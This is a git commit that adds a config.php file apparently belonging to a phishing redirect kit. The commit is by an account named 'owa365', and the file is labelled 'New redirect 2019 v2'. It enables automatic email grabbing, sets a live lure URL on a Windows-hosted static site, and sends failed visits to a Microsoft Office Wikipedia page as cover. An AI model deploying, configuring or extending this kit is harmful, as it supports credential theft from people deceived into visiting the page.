d884cc465959bf8b8fb2583d2fe567eb84c9c521
owa365 <127124059+owa365@users.noreply.github.com>
2024-11-05 10:59:48 -0800

    Add files via upload

---
+++ config.php
@@ -0,0 +1,16 @@
+<?php
+/* 
+
+New redirect 2019 v2 
+
+Email: 
+
+Facebook: 
+
+ICQ: 
+*/
+$autoEmail="true";//"true":Auto email grabing/ "false":without auto email grabing
+$pagelink="https://smartify.z24.web.core.windows.net/quna/index.html";
+$FailRedirect="https://www.wikipedia.org/wiki/Microsoft_Office";
+$redirecttype="1";// 1:header - 2:script
+?>
